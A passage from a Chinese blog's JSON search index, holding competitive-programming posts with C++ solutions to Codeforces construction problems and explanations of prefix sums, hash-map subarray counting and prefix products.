3){ f.push_back(mx - 3); f.push_back(mx - 1); for(int i = mx - 5; i \u003e 0; i -= 2) f.push_back(i); } if(f.size() == n){ for(auto i : f) cout \u003c\u003c i \u003c\u003c ' '; cout \u003c\u003c '\\n'; }else{ cout \u003c\u003c -1 \u003c\u003c '\\n'; } }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:2:2","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"1353D 优先队列维护区间\r","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题意\r给你一个全为0的数组 要求把 1 到 n 插入，插入规则为：第i次选择一个左边最长的全0区间，将区间 (l+r)/2的位置变为 i. ","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:1","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题解\r模拟插入过程，将区间信息用优先队列维护和自定义排序即可，堆存[l,r]，表示 从l到r是全为0的区间，每次取堆顶再判断是否要插入被分割的区间即可 typedef pair\u003cint ,int \u003e P; int n; struct cmp{ bool operator()(const P p1, const P p2) { if(p1.second-p1.first == p2.second-p2.first) return p1.first \u003e p2.first; return p1.second-p1.first \u003c p2.second-p2.first; } }; void solve(){ cin \u003e\u003e n; for(int i = 1; i \u003c= n; i++) a[i] = 0; priority_queue\u003cpair\u003cint, int\u003e, vector\u003cpair\u003cint,int\u003e\u003e, cmp\u003e que; int pl = 1, pr = n; int mid = (pl + pr) \u003e\u003e 1; a[mid] = 1; if(1 \u003c mid) que.push({1, mid - 1}); if(mid \u003c n) que.push({mid + 1, n}); int idx = 2; while(que.size()){ auto tmp = que.top(); que.pop(); int l = tmp.first, r = tmp.second; int mid = (l + r) \u003e\u003e 1; a[mid] = idx++; if(l \u003c mid) que.push({l, mid - 1}); if(mid \u003c r) que.push({mid + 1, r}); } for(int i = 1; i \u003c= n; i++) cout \u003c\u003c a[i] \u003c\u003c ' '; cout \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:3:2","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"1497C2 构造 数学 从特殊到一般\r","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:0","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题意\r给出n和k， (3≤n≤109, 3≤k≤n).构造数组满足 数组长度为k 数组的元素和等于n lcm(x1, …., xk) \u003c= n/2 ","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:1","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"题解\r先考虑特殊情况，当k等于3的时候，若n为奇数时，输出1、(n-1)/2、(n-1)/2一定满足条件 若n为偶数时，让一位先等于2,有[2,0,0]，若(n-2)/2仍为偶数，则可以，若为奇数则不行,即当n为偶数且(n - 2)是4的倍数即n%4==2时输出[2, (n - 2)/2, (n - 2)/2]; 此时奇数为n%4==1和n%4==3的情况，还剩下n%4 == 0的情况。当n是4的倍数时，将n分为1、1、2即可输出[n / 4, n / 4, n / 2] 再考虑普通情况,已知当k=3时一定有固定解，所以只需要把剩下的k - 3个位置全置为1即可，再将(n - k + 3)分给最后三个位置 void print(ll n){ ll d = n / 4; if(n % 4 == 0){ cout \u003c\u003c d \u003c\u003c ' ' \u003c\u003c d \u003c\u003c ' ' \u003c\u003c d * 2 \u003c\u003c '\\n'; }else if(n % 4 == 1){ cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c '\\n'; }else if(n % 4 == 2){ cout \u003c\u003c 2 \u003c\u003c ' ' \u003c\u003c (n - 2) / 2 \u003c\u003c ' ' \u003c\u003c (n - 2) / 2 \u003c\u003c '\\n'; }else{ cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c ' ' \u003c\u003c (n - 1) / 2 \u003c\u003c '\\n'; } } void solve(){ ll n, k; cin \u003e\u003e n \u003e\u003e k; if(k == 3){ print(n); }else{ for(int i = 1; i \u003c= k - 3; i++) cout \u003c\u003c 1 \u003c\u003c ' '; n -= k - 3; print(n); } }","date":"2024-06-11","objectID":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/:4:2","tags":["构造"],"title":"构造体联系记录","uri":"/posts/%E6%9E%84%E9%80%A0%E9%A2%98%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"categories":["算法和数据结构"],"content":"前缀和\r给出一个数列： 1 2 3 4 5 6 7 8 9 它的前缀和： 1 3 6 10 15 21 28 36 45前缀和即：从第一个元素到该元素之和 通常我们会在数组中触及到这类知识。 假设给出原数组 a[5] = {1,2,3,4,5}，我们可以得到前缀和数组，假设为S[5] = {1,3,6,10,15}。 那么可以得到： S[n] = S[n-1] + a[n]，即求前缀和的公式。 ","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:0:0","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"那么前缀和数组有什么用呢？\r以下给出一道经典前缀和问题： 首先我们先从朴素思想开始考虑，求m次区间和的时间复杂度是O(mn^2^) while(m--)\r{\rint l , r;\rcin \u003e\u003e l \u003e\u003e r;\rint sum = 0;\rfor(int i = l; i \u003c= r; i++)\r{\rsum += num[i];(假设下标从1开始）\r}\rcout \u003c\u003c sum \u003c\u003c endl;\r}我们会发现，我们没求一次区间和，就要循环一次，那么有没有一种方法可以让O(n)的求和变为O(1)的时间复杂度呢？ 答案就是使用前缀和。对区间[l,r]，通过对求前缀和过程的分析可以的出，区间和为s[r]-s[l-1]。因此我们可以通过一次运算求出原数组任意一段数据的和。 以下为代码： #include\u003ciostream\u003e\r#define N 100010\rusing namespace std;\rint nums[N];\rint s[N];\rint main()\r{\rint n,m;\rcin \u003e\u003e n \u003e\u003e m;\rfor(int i = 0; i \u003c n; i++)\r{ cin \u003e\u003e nums[i+1];\rs[i+1] = s[i] + nums[i+1];//求前缀和\r}\rwhile(m--)\r{\rint l,r;\rcin \u003e\u003e l \u003e\u003e r;\rcout \u003c\u003c s[r]-s[l-1] \u003c\u003c endl;//\r}\rreturn 0;\r}","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:1:0","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"题目\r","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:0","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"前缀和结合哈希表\rhttps://leetcode.cn/problems/subarray-sum-equals-k/ 在数组中：\r1.子数组\r子数组的定义：一个或连续多个数组中的元素组成一个子数组(子数组最少包含一个元素)\r2.子序列\r子序列的定义：子序列就是在原来序列中找出一部分组成的序列（子序列不一定连续）如果使用for嵌套循环暴力枚举O(n^2^)的方法必然会超时。 那么分析题意，可知求区间和为k的区间个数,即 s[i] - s[j] == k 同样，如果对前缀和数组进行枚举同样是O(n^2^)的时间复杂度,会超时。 我们用哈希表存储前缀和数组，结合公式s[i] - s[j] == k的变形s[j] = s[i] - k就可以实现O(n)的时间复杂度的解法。 即：对每一个前缀和数组元素s[i],利用哈希表查找s[i] - k是否存在，存在则找到了一个或n个符合题意的区间。 以下为代码 class Solution {\rpublic:\rint subarraySum(vector\u003cint\u003e\u0026 nums, int k) {\runordered_map\u003cint, int\u003e mp;\rmp[0] = 1;\rint sum = 0;\rint ans = 0;\rfor(int i = 0; i \u003c nums.size(); i++)\r{\rsum += nums[i];\rif(mp.find(sum - k) != mp.end())//\rans += mp[sum - k];\rmp[sum]++;\r}\rreturn ans;\r}\r};","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:1","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"前缀乘积\r","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:2","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"},{"categories":["算法和数据结构"],"content":"https://leetcode.cn/problems/subarray-sum-equals-k/\r最先想到的是遍历求乘积，也就是O(n^2^)的暴力算法，但这不符合题目的要求。 那么我们需要对算法进行优化，从朴素思想出发，遍历求乘积时，从0到n-1累乘，中间跳过i，那么天然地由i分为左右两个区间，根据乘法的结合律，得出answer[i] = i左侧元素的乘积*i右侧元素的乘积。 那么我们只需要提前将每一个i左侧、右侧元素的乘积算出来，就可以实现O(n)时间复杂度的算法。 class Solution {\rpublic:\rvector\u003cint\u003e productExceptSelf(vector\u003cint\u003e\u0026 nums) {\rint n = nums.size();\rvector\u003cint\u003e answer(n);\rvector\u003cint\u003e l(n);\rvector\u003cint\u003e r(n);\rl[0] = 1;\rr[n - 1] = 1;\rfor(int i = 1; i \u003c n; i++)\rl[i] = l[i-1]*nums[i-1];\rfor(int i = n - 2; i \u003e= 0; i--)\rr[i] = r[i+1]*nums[i+1];\rfor(int i = 0; i \u003c n; i++)\ranswer[i] = l[i]*r[i];\rreturn answer;\r}\r};","date":"2024-06-11","objectID":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/:2:3","tags":["算法"],"title":"前缀和","uri":"/posts/%E5%89%8D%E7%BC%80%E5%92%8C/"}]